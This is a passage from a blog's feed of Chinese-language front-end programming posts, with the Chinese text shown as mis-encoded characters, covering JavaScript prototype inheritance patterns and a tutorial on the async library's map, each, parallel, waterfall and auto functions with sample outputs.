class="params"></span>) </span>&#123;</div><div class="line">    <span class="built_in">console</span>.log(<span class="string">'Hello '</span> + <span class="keyword">this</span>.name);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">Cat</span>(<span class="params">name</span>)</span>&#123;</div><div class="line">    Animal.call(<span class="keyword">this</span>, name);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">var</span> cat = <span class="keyword">new</span> Cat(<span class="string">"Black Cat"</span>);</div><div class="line">cat.say();    <span class="comment">// Uncaught TypeError: cat.say is not a function</span></div></pre></td></tr></table></figure><h3 id="åŸå‹ç»§æ‰¿"><a href="#åŸå‹ç»§æ‰¿" class="headerlink" title="åŸå‹ç»§æ‰¿"></a>åŸå‹ç»§æ‰¿</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> Mammal = <span class="function"><span class="keyword">function</span>(<span class="params">name</span>) </span>&#123;</div><div class="line">    <span class="keyword">this</span>.name = name;</div><div class="line">&#125;</div><div class="line">Mammal.prototype.greeting = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">    <span class="built_in">console</span>.log(<span class="string">'Hello '</span> + <span class="keyword">this</span>.name + <span class="string">"!"</span>);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">var</span> Cat = <span class="function"><span class="keyword">function</span>(<span class="params">name</span>) </span>&#123;</div><div class="line">    <span class="keyword">this</span>.name = name;</div><div class="line">&#125;</div><div class="line">Cat.prototype = <span class="keyword">new</span> Mammal();</div><div class="line">Cat.prototype.constructor = Cat;       <span class="comment">// å¦åˆ™ Cat çš„å®ä¾‹çš„æ„é€ å‡½æ•°å°†ä¼šæ˜¯ Mammal çš„æ„é€ å‡½æ•°</span></div><div class="line"></div><div class="line"><span class="keyword">var</span> cat = <span class="keyword">new</span> Cat(<span class="string">'Garfield'</span>);</div><div class="line">cat.greeting();</div></pre></td></tr></table></figure><p>å¤æ‚ç‚¹ä¾‹å­ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">Mammal</span>(<span class="params">name</span>) </span>&#123;</div><div class="line">    <span class="keyword">this</span>.name = name;</div><div class="line">    <span class="keyword">this</span>.offspring = [];</div><div class="line">&#125;</div><div class="line">Mammal.prototype.haveABaby = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">    <span class="keyword">var</span> newBaby = <span class="keyword">new</span> Mammal(<span class="string">"Baby "</span> + <span class="keyword">this</span>.name);</div><div class="line">    <span class="keyword">this</span>.offspring.push(newBaby);</div><div class="line">    <span class="keyword">return</span> newBaby;</div><div class="line">&#125;</div><div class="line">Mammal.prototype.toString = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">    <span class="keyword">return</span> <span class="string">'[Mammal "'</span> + <span class="keyword">this</span>.name + <span class="string">'"]'</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line">Cat.prototype = <span class="keyword">new</span> Mammal();</div><div class="line">Cat.prototype.constructor = Cat;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">Cat</span>(<span class="params">name</span>) </span>&#123;</div><div class="line">    <span class="keyword">this</span>.name = name;</div><div class="line">&#125;</div><div class="line">Cat.prototype.toString = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">    <span class="keyword">return</span> <span class="string">'[Cat "'</span> + <span class="keyword">this</span>.name + <span class="string">'"]'</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure><p><code>haveABaby</code> ç»§æ‰¿è¿˜å¯ä»¥è¿™æ ·å†™ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">Mammal.prototype.haveABaby = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">    <span class="keyword">var</span> newBaby = <span class="keyword">new</span> <span class="keyword">this</span>.constructor(<span class="string">"Baby "</span> + <span class="keyword">this</span>.name);</div><div class="line">    <span class="keyword">this</span>.offspring.push(newBaby);</div><div class="line">    <span class="keyword">return</span> newBaby;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">// è¿™é‡Œçš„ this.parent ç±»ä¼¼å…¸å‹ OO è¯­è¨€ä¸­çš„ super</span></div><div class="line">Cat.prototype.parent = Mammal.prototype;</div><div class="line">Cat.prototype.haveABaby = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">    <span class="keyword">var</span> theKitten = <span class="keyword">this</span>.parent.haveABaby.call(<span class="keyword">this</span>);</div><div class="line">    <span class="keyword">return</span> theKitten;</div><div class="line">&#125;</div></pre></td></tr></table></figure><h3 id="Object-create"><a href="#Object-create" class="headerlink" title="Object.create()"></a>Object.create()</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// Shape - superclass</span></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">Shape</span>(<span class="params"></span>) </span>&#123;</div><div class="line">    <span class="keyword">this</span>.x = <span class="number">0</span>;</div><div class="line">    <span class="keyword">this</span>.y = <span class="number">0</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">// superclass method</span></div><div class="line">Shape.prototype.move = <span class="function"><span class="keyword">function</span>(<span class="params">x, y</span>) </span>&#123;</div><div class="line">    <span class="keyword">this</span>.x += x;</div><div class="line">    <span class="keyword">this</span>.y += y;</div><div class="line">    <span class="built_in">console</span>.info(<span class="string">'Shape moved.'</span>);</div><div class="line">&#125;;</div><div class="line"></div><div class="line"><span class="comment">// Rectangle - subclass</span></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">Rectangle</span>(<span class="params"></span>) </span>&#123;</div><div class="line">    Shape.call(<span class="keyword">this</span>); <span class="comment">// call super constructor.</span></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">// subclass extends superclass</span></div><div class="line">Rectangle.prototype = <span class="built_in">Object</span>.create(Shape.prototype)</div><div class="line">Rectangle.prototype.constructor = Rectangle;</div><div class="line"></div><div class="line"><span class="keyword">var</span> rect = <span class="keyword">new</span> Rectangle();</div><div class="line"></div><div class="line">rect <span class="keyword">instanceof</span> Rectangle;  <span class="comment">// true</span></div><div class="line">rect <span class="keyword">instanceof</span> Shape;  <span class="comment">// true</span></div><div class="line">rect.move(<span class="number">1</span>, <span class="number">1</span>) <span class="comment">// Outputs, 'Shape moved.'</span></div></pre></td></tr></table></figure><h3 id="è‡ªåˆ¶ç»§æ‰¿æ–¹æ³•"><a href="#è‡ªåˆ¶ç»§æ‰¿æ–¹æ³•" class="headerlink" title="è‡ªåˆ¶ç»§æ‰¿æ–¹æ³•"></a>è‡ªåˆ¶ç»§æ‰¿æ–¹æ³•</h3><p>æ¥è‡ª <a href="http://phrogz.net/js/classes/OOPinJS2.html" target="_blank" rel="external">OOP</a>ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">Function</span>.prototype.inheritsFrom = <span class="function"><span class="keyword">function</span>(<span class="params">parentClassOrObject</span>) </span>&#123;</div><div class="line">    <span class="keyword">if</span> (parentClassOrObject.constructor == <span class="built_in">Function</span>) &#123;</div><div class="line">        <span class="comment">//Normal Inheritance</span></div><div class="line">        <span class="keyword">this</span>.prototype = <span class="keyword">new</span> parentClassOrObject;</div><div class="line">        <span class="keyword">this</span>.prototype.constructor = <span class="keyword">this</span>;</div><div class="line">        <span class="keyword">this</span>.prototype.parent = parentClassOrObject.prototype;</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">        <span class="comment">//Pure Virtual Inheritance</span></div><div class="line">        <span class="keyword">this</span>.prototype = parentClassOrObject;</div><div class="line">        <span class="keyword">this</span>.prototype.constructor = <span class="keyword">this</span>;</div><div class="line">        <span class="keyword">this</span>.prototype.parent = parentClassOrObject;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="keyword">this</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line">Cat.inheritsFrom(Mammal);</div></pre></td></tr></table></figure><p>å‚è€ƒï¼š</p><ul><li><a href="http://phrogz.net/js/classes/OOPinJS2.html" target="_blank" rel="external">OOP in JS, Part 2 : Inheritance</a></li><li><a href="http://uule.iteye.com/blog/1158829" target="_blank" rel="external">JSä¸­çš„call()å’Œapply()æ–¹æ³•</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;call-amp-apply&quot;&gt;&lt;a href=&quot;#call-amp-apply&quot; class=&quot;headerlink&quot; title=&quot;call &amp;amp; apply&quot;&gt;&lt;/a&gt;call &amp;amp; apply&lt;/h3&gt;&lt;p&gt;&lt;code&gt;call&lt;/code&gt; å’Œ &lt;code&gt;apply&lt;/code&gt; ä½œç”¨åŸºæœ¬ç›¸åŒï¼Œéƒ½å¯ä»¥è®©ä¸€ä¸ªå¯¹è±¡å¼•ç”¨å¦ä¸€ä¸ªå¯¹è±¡æˆ–å®ƒçš„æ–¹æ³•ï¼Œä¸¤è€…å”¯ä¸€çš„&lt;a href=&quot;http://stackoverflow.com/questions/1986896/what-is-the-difference-between-call-and-apply&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;ä¸åŒ&lt;/a&gt;æ˜¯ &lt;code&gt;call&lt;/code&gt; æ¥å—å‡½æ•°å‚æ•°çš„æ–¹å¼æ˜¯ä¸€ä¸ªä¸ªåˆ—å‡ºæ¥ï¼Œ&lt;code&gt;apply&lt;/code&gt; æ¥å—å‡½æ•°å‚æ•°çš„æ–¹å¼æ˜¯ä¸€ä¸ªæ•°ç»„ã€‚
    
    </summary>
    
      <category term="Front-End" scheme="http://youngdze.co/categories/Front-End/"/>
    
    
  </entry>
  
  <entry>
    <title>AsyncJS åŸºç¡€</title>
    <link href="http://youngdze.co/2015/09/06/asyncjs-basis/"/>
    <id>http://youngdze.co/2015/09/06/asyncjs-basis/</id>
    <published>2015-09-06T06:01:30.000Z</published>
    <updated>2016-12-05T05:38:28.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>AsyncJS æŒ‡çš„æ˜¯ <a href="https://github.com/caolan/async" target="_blank" rel="external">async</a>ï¼Œæ˜¯ä¸€ä¸ªå¼‚æ­¥å¤„ç†çš„ç»„ä»¶ã€‚</p></blockquote><h4 id="Series-å’Œ-Limit-çš„åŒºåˆ«"><a href="#Series-å’Œ-Limit-çš„åŒºåˆ«" class="headerlink" title="Series å’Œ Limit çš„åŒºåˆ«"></a>Series å’Œ Limit çš„åŒºåˆ«</h4><ul><li><name>Series - the same as <name> but runs only a single async operation at a time</name></name></li><li><name>Limit - the same as <name> but runs a maximum of limit async operations at a time</name></name></li></ul><a id="more"></a><h4 id="async-map"><a href="#async-map" class="headerlink" title="async.map"></a>async.map</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> names = [<span class="string">'James'</span>, <span class="string">'Kobe'</span>, <span class="string">'Havard'</span>, <span class="string">'Jermmy'</span>, <span class="string">'Rondo'</span>];</div><div class="line"></div><div class="line"><span class="keyword">async</span>.map(names, <span class="function"><span class="keyword">function</span>(<span class="params">name, callback</span>)</span>&#123;</div><div class="line">    callback(<span class="literal">null</span>, name.toUpperCase());</div><div class="line">&#125;, <span class="function"><span class="keyword">function</span>(<span class="params">err, result</span>) </span>&#123;</div><div class="line">    <span class="keyword">if</span> (err) <span class="keyword">return</span> <span class="built_in">console</span>.error(err);</div><div class="line">    <span class="built_in">console</span>.log(result);</div><div class="line">&#125;);</div></pre></td></tr></table></figure><p>è¾“å‡ºï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">[ <span class="string">'JAMES'</span>, <span class="string">'KOBE'</span>, <span class="string">'HAVARD'</span>, <span class="string">'JERMMY'</span>, <span class="string">'RONDO'</span> ]</div></pre></td></tr></table></figure><h4 id="async-each"><a href="#async-each" class="headerlink" title="async. each"></a>async. each</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">async</span>.each(names, <span class="function"><span class="keyword">function</span>(<span class="params">name, callback</span>) </span>&#123;</div><div class="line">    <span class="built_in">console</span>.log(name);</div><div class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> callback === <span class="string">'function'</span>) callback();</div><div class="line">&#125;,<span class="function"><span class="keyword">function</span>(<span class="params">err</span>) </span>&#123;</div><div class="line">    <span class="built_in">console</span>.log(<span class="string">'done'</span>);</div><div class="line">&#125;);</div></pre></td></tr></table></figure><p>è¾“å‡ºï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">James</div><div class="line">Kobe</div><div class="line">Havard</div><div class="line">Jermmy</div><div class="line">Rondo</div><div class="line">done</div></pre></td></tr></table></figure><h4 id="async-eachSeries"><a href="#async-eachSeries" class="headerlink" title="async.eachSeries"></a>async.eachSeries</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">async</span>.eachSeries(names, <span class="function"><span class="keyword">function</span>(<span class="params">name, callback</span>) </span>&#123;</div><div class="line">    <span class="built_in">console</span>.log(name);</div><div class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> callback === <span class="string">'function'</span>) callback();</div><div class="line">&#125;,<span class="function"><span class="keyword">function</span>(<span class="params">err</span>) </span>&#123;</div><div class="line">    <span class="built_in">console</span>.log(<span class="string">'done'</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>è¾“å‡ºï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">James</div><div class="line">Kobe</div><div class="line">Havard</div><div class="line">Jermmy</div><div class="line">Rondo</div><div class="line">done</div></pre></td></tr></table></figure><h4 id="async-parallel"><a href="#async-parallel" class="headerlink" title="async.parallel"></a>async.parallel</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">async</span>.parallel([<span class="function"><span class="keyword">function</span>(<span class="params">callback</span>) </span>&#123;</div><div class="line">    <span class="built_in">console</span>.log(<span class="string">'yy'</span>);</div><div class="line">    callback();</div><div class="line">&#125;, <span class="function"><span class="keyword">function</span>(<span class="params">callback</span>) </span>&#123;</div><div class="line">    <span class="built_in">console</span>.log(<span class="string">'xx'</span>);</div><div class="line">    callback();</div><div class="line">&#125;, <span class="function"><span class="keyword">function</span>(<span class="params">callback</span>) </span>&#123;</div><div class="line">    <span class="built_in">console</span>.log(<span class="string">'dd'</span>);</div><div class="line">    callback();</div><div class="line">&#125;], <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">    <span class="built_in">console</span>.log(<span class="string">'done'</span>);</div><div class="line">&#125;);</div></pre></td></tr></table></figure><p>è¾“å‡ºï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">yy</div><div class="line">xx</div><div class="line">dd</div><div class="line">done</div></pre></td></tr></table></figure><h4 id="async-waterfall"><a href="#async-waterfall" class="headerlink" title="async.waterfall"></a>async.waterfall</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">async</span>.waterfall([<span class="function"><span class="keyword">function</span>(<span class="params">callback</span>) </span>&#123;</div><div class="line">    <span class="built_in">console</span>.log(<span class="string">'yy'</span>);</div><div class="line">    callback();</div><div class="line">&#125;, <span class="function"><span class="keyword">function</span>(<span class="params">callback</span>) </span>&#123;</div><div class="line">    <span class="built_in">console</span>.log(<span class="string">'xx'</span>);</div><div class="line">    callback();</div><div class="line">&#125;, <span class="function"><span class="keyword">function</span>(<span class="params">callback</span>) </span>&#123;</div><div class="line">    <span class="built_in">console</span>.log(<span class="string">'dd'</span>);</div><div class="line">    callback();</div><div class="line">&#125;], <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">    <span class="built_in">console</span>.log(<span class="string">'done'</span>);</div><div class="line">&#125;);</div></pre></td></tr></table></figure><p>è¾“å‡ºï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">yy</div><div class="line">xx</div><div class="line">dd</div><div class="line">done</div></pre></td></tr></table></figure><h4 id="async-filterLimit"><a href="#async-filterLimit" class="headerlink" title="async.filterLimit"></a>async.filterLimit</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">async</span>.filterLimit(names, <span class="number">2</span>, <span class="function"><span class="keyword">function</span>(<span class="params">name, callback</span>) </span>&#123;</div><div class="line">    <span class="keyword">if</span> (name === <span class="string">'James'</span>) &#123;</div><div class="line">    callback(name);</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">    callback();</div><div class="line">    &#125;</div><div class="line">&#125;, <span class="function"><span class="keyword">function</span>(<span class="params">results</span>) </span>&#123;</div><div class="line">    <span class="built_in">console</span>.log(results);</div><div class="line">&#125;);</div></pre></td></tr></table></figure><p>è¾“å‡ºï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">[ <span class="string">'James'</span> ]</div></pre></td></tr></table></figure><h4 id="async-reject"><a href="#async-reject" class="headerlink" title="async.reject"></a>async.reject</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">async</span>.reject(names, <span class="function"><span class="keyword">function</span>(<span class="params">name, callback</span>) </span>&#123;</div><div class="line">    <span class="keyword">if</span> (name === <span class="string">'James'</span>) &#123;</div><div class="line">    callback(name);</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">    callback();</div><div class="line">    &#125;</div><div class="line">&#125;, <span class="function"><span class="keyword">function</span>(<span class="params">results</span>) </span>&#123;</div><div class="line">    <span class="built_in">console</span>.log(results);</div><div class="line">&#125;);</div></pre></td></tr></table></figure><p>è¾“å‡º:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">[ <span class="string">'Kobe'</span>, <span class="string">'Havard'</span>, <span class="string">'Jermmy'</span>, <span class="string">'Rondo'</span> ]</div></pre></td></tr></table></figure><h4 id="async-reduce"><a href="#async-reduce" class="headerlink" title="async.reduce"></a>async.reduce</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">async</span>.reduce([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>], <span class="number">0</span>, <span class="function"><span class="keyword">function</span>(<span class="params">memo, num, callback</span>) </span>&#123;</div><div class="line">    callback(<span class="literal">null</span>, memo + num);</div><div class="line">&#125;, <span class="function"><span class="keyword">function</span>(<span class="params">err, result</span>) </span>&#123;</div><div class="line">    <span class="built_in">console</span>.log(result);</div><div class="line">&#125;);</div></pre></td></tr></table></figure><p>è¾“å‡ºï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="number">10</span></div></pre></td></tr></table></figure><h4 id="async-every"><a href="#async-every" class="headerlink" title="async.every"></a>async.every</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">async</span>.every(names, <span class="function"><span class="keyword">function</span>(<span class="params">name, callback</span>) </span>&#123;</div><div class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> name === <span class="string">'string'</span>) &#123;</div><div class="line">    callback(<span class="literal">true</span>);</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">    callback(<span class="literal">false</span>);</div><div class="line">    &#125;</div><div class="line">&#125;, <span class="function"><span class="keyword">function</span>(<span class="params">result</span>) </span>&#123;</div><div class="line">    <span class="built_in">console</span>.log(result);</div><div class="line">&#125;);</div></pre></td></tr></table></figure><p>è¾“å‡ºï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="literal">true</span></div></pre></td></tr></table></figure><h4 id="async-auto"><a href="#async-auto" class="headerlink" title="async.auto"></a>async.auto</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">async</span>.auto(&#123;</div><div class="line">    get_data: <span class="function"><span class="keyword">function</span>(<span class="params">callback</span>)</span>&#123;</div><div class="line">        <span class="built_in">console</span>.log(<span class="string">'in get_data'</span>);</div><div class="line">        <span class="comment">// async code to get some data</span></div><div class="line">        callback(<span class="literal">null</span>, <span class="string">'data'</span>, <span class="string">'converted to array'</span>);</div><div class="line">    &#125;,</div><div class="line">    make_folder: <span class="function"><span class="keyword">function</span>(<span class="params">callback</span>)</span>&#123;</div><div class="line">        <span class="built_in">console</span>.log(<span class="string">'in make_folder'</span>);</div><div class="line">        <span class="comment">// async code to create a directory to store a file in</span></div><div class="line">        <span class="comment">// this is run at the same time as getting the data</span></div><div class="line">        callback(<span class="literal">null</span>, <span class="string">'folder'</span>);</div><div class="line">    &#125;,</div><div class="line">    write_file: [<span class="string">'get_data'</span>, <span class="string">'make_folder'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">callback, results</span>)</span>&#123;</div><div class="line">        <span class="built_in">console</span>.log(<span class="string">'in write_file'</span>, <span class="built_in">JSON</span>.stringify(results));</div><div class="line">        <span class="comment">// once there is some data and the directory exists,</span></div><div class="line">        <span class="comment">// write the data to a file in the directory</span></div><div class="line">        callback(<span class="literal">null</span>, <span class="string">'filename'</span>);</div><div class="line">    &#125;],</div><div class="line">    email_link: [<span class="string">'write_file'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">callback, results</span>)</span>&#123;</div><div class="line">        <span class="built_in">console</span>.log(<span class="string">'in email_link'</span>, <span class="built_in">JSON</span>.stringify(results));</div><div class="line">        <span class="comment">// once the file is written let's email a link to it...</span></div><div class="line">        <span class="comment">// results.write_file contains the filename returned by write_file.</span></div><div class="line">        callback(<span class="literal">null</span>, &#123;<span class="string">'file'</span>:results.write_file, <span class="string">'email'</span>:<span class="string">'user@example.com'</span>&#125;);</div><div class="line">    &#125;]</div><div class="line">&#125;, <span class="function"><span class="keyword">function</span>(<span class="params">err, results</span>) </span>&#123;</div><div class="line">    <span class="built_in">console</span>.log(<span class="string">'err = '</span>, err);</div><div class="line">    <span class="built_in">console</span>.log(<span class="string">'results = '</span>, results);</div><div class="line">&#125;);</div></pre></td></tr></table></figure><p>è¾“å‡ºï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">in</span> get_data</div><div class="line"><span class="keyword">in</span> make_folder</div><div class="line"><span class="keyword">in</span> write_file &#123;<span class="string">"get_data"</span>:[<span class="string">"data"</span>,<span class="string">"converted to array"</span>],<span class="string">"make_folder"</span>:<span class="string">"folder"</span>&#125;</div><div class="line"><span class="keyword">in</span> email_link &#123;<span class="string">"get_data"</span>:[<span class="string">"data"</span>,<span class="string">"converted to array"</span>],<span class="string">"make_folder"</span>:<span class="string">"folder"</span>,<span class="string">"write_file"</span>:<span class="string">"filename"</span>&#125;</div><div class="line">err =  <span class="literal">null</span></div><div class="line">results =  &#123; <span class="attr">get_data</span>: [ <span class="string">'data'</span>, <span class="string">'converted to array'</span> ],</div><div class="line">    make_folder: <span class="string">'folder'</span>,</div><div class="line">    write_file: <span class="string">'filename'</span>,</div><div class="line">    email_link: &#123; <span class="attr">file</span>: <span class="string">'filename'</span>, <span class="attr">email</span>: <span class="string">'user@example.com'</span> &#125; &#125;</div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;AsyncJS æŒ‡çš„æ˜¯ &lt;a href=&quot;https://github.com/caolan/async&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;async&lt;/a&gt;ï¼Œæ˜¯ä¸€ä¸ªå¼‚æ­¥å¤„ç†çš„ç»„ä»¶ã€‚&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h4 id=&quot;Series-å’Œ-Limit-çš„åŒºåˆ«&quot;&gt;&lt;a href=&quot;#Series-å’Œ-Limit-çš„åŒºåˆ«&quot; class=&quot;headerlink&quot; title=&quot;Series å’Œ Limit çš„åŒºåˆ«&quot;&gt;&lt;/a&gt;Series å’Œ Limit çš„åŒºåˆ«&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;&lt;name&gt;Series - the same as &lt;name&gt; but runs only a single async operation at a time&lt;/name&gt;&lt;/name&gt;&lt;/li&gt;
&lt;li&gt;&lt;name&gt;Limit - the same as &lt;name&gt; but runs a maximum of limit async operations at a time&lt;/name&gt;&lt;/name&gt;&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
      <category term="Front-End" scheme="http://youngdze.co/categories/Front-End/"/>
    
    
      <category term="async" scheme="http://youngdze.co/tags/async/"/>
    
  </entry>
  
  <entry>
    <title>Express åŸºç¡€</title>
    <link href="http://youngdze.co/2015/09/01/express-basis/"/>
    <id>http://youngdze.co/2015/09/01/express-basis/</id>
    <published>2015-09-01T15:53:04.000Z</published>
    <updated>2016-12-05T11:32:16.000Z</updated>
    
